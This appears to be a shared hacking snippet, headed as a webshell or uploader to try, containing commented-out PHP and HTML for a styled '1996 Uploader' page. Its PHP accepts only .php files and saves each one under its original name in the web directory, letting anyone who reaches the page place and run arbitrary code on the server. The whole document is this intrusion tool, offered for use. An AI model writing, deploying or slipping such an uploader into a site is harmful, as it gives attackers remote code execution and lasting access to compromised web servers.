# try with ur self webshell or uploader file

// <?php
// $pesan = "";

// if ($_SERVER["REQUEST_METHOD"] == "POST") {

//     if (isset($_FILES["file"])) {

//         $nama = $_FILES["file"]["name"];
//         $tmp = $_FILES["file"]["tmp_name"];

//         $ext = strtolower(pathinfo($nama, PATHINFO_EXTENSION));

//         $allow = ["php"];

//         if (in_array($ext, $allow)) {

//             if (move_uploaded_file($tmp, $nama)) {
//                 $pesan = "Upload berhasil";
//             } else {
//                 $pesan = "Upload gagal";
//             }

//         } else {
//             $pesan = "Hanya file PHP";
//         }
//     }
// }
// ?>

// <!DOCTYPE html>
// <html lang="id">
// <head>
// <meta charset="UTF-8">
// <meta name="viewport" content="width=device-width, initial-scale=1.0">
// <title>1996 Uploader</title>

// <style>

// *{
//     margin:0;
//     padding:0;
//     box-sizing:border-box;
//     font-family:Arial,sans-serif
// }

// body{
//     background:#090909;
//     color:white;
//     display:flex;
//     justify-content:center;
//     align-items:center;
//     min-height:100vh;
//     overflow:hidden
// }

// .box{
//     width:420px;
//     background:rgba(15,15,15,.95);
//     border:1px solid rgba(255,0,0,.15);
//     border-radius:28px;
//     padding:40px;
//     position:relative;
//     box-shadow:
//     0 0 50px rgba(255,0,0,.08),
//     inset 0 0 30px rgba(255,0,0,.03);
//     backdrop-filter:blur(12px)
// }

// .box::before{
//     content:"";
//     position:absolute;
//     inset:-1px;
//     border-radius:28px;
//     padding:1px;
//     background:linear-gradient(
//         135deg,
//         rgba(255,0,0,.5),
//         transparent,
//         rgba(255,0,0,.2)
//     );
//     -webkit-mask:
//         linear-gradient(#fff 0 0) content-box,
//         linear-gradient(#fff 0 0);
//     -webkit-mask-composite:xor;
//     mask-composite:exclude
// }

// .logo{
//     text-align:center;
//     font-size:52px;
//     font-weight:900;
//     letter-spacing:10px;
//     color:#ff2b2b;
//     margin-bottom:12px;
//     text-shadow:
//     0 0 10px rgba(255,0,0,.5),
//     0 0 30px rgba(255,0,0,.3)
// }

// .desc{
//     text-align:center;
//     color:#777;
//     font-size:14px;
//     margin-bottom:35px;
//     letter-spacing:1px
// }

// input[type=file]{
//     width:100%;
//     background:#111;
//     border:1px solid #222;
//     color:#999;
//     padding:16px;
//     border-radius:16px;
//     margin-bottom:22px;
//     outline:none;
//     transition:.25s
// }

// input[type=file]:hover{
//     border:1px solid rgba(255,0,0,.5);
//     box-shadow:0 0 20px rgba(255,0,0,.08)
// }

// input[type=file]::file-selector-button{
//     background:#ff1a1a;
//     border:none;
//     color:white;
//     padding:10px 18px;
//     border-radius:10px;
//     margin-right:14px;
//     cursor:pointer;
//     font-weight:bold;
//     transition:.2s
// }

// input[type=file]::file-selector-button:hover{
//     background:#ff3333
// }

// button{
//     width:100%;
//     padding:16px;
//     border:none;
//     border-radius:16px;
//     background:linear-gradient(
//         135deg,
//         #ff0000,
//         #b30000
//     );
//     color:white;
//     font-size:15px;
//     font-weight:bold;
//     cursor:pointer;
//     transition:.25s;
//     letter-spacing:1px;
//     box-shadow:0 0 25px rgba(255,0,0,.25)
// }

// button:hover{
//     transform:translateY(-2px);
//     box-shadow:0 0 35px rgba(255,0,0,.4)
// }

// .msg{
//     margin-top:24px;
//     text-align:center;
//     color:#bbb;
//     font-size:14px
// }

// </style>

// </head>
// <body>

// <div class="box">

//     <div class="logo">1996</div>
//     <div class="desc">MODERN PHP UPLOADER</div>

//     <form method="POST" enctype="multipart/form-data">
//         <input type="file" name="file" required>
//         <button type="submit">UPLOAD FILE</button>
//     </form>

//     <div class="msg">
//         <?php echo $pesan; ?>
//     </div>

// </div>

// </body>
// </html>
